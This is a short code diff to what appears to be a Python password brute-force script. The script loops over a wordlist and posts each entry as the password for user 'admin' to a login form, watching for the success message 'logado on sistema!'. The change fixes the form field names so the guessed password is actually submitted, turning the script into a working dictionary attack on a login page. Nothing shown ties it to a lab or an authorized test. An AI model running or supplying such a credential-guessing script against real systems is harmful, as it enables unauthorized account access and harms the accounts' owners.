@@ -7,7 +7,7 @@ for line in arq:
 	password = line.strip()
 
 #	http = requests.post(url, data={'input1':'admin', 'input2':'password'})
-	http = requests.post(url, data={'input1':'admin','input2':'password', 'sub':'submit'})
+	http = requests.post(url, data={'username':'admin','password':password, 'login':'submit'})
 	content = http.content
 
 	if "logado on sistema!" in str(content):
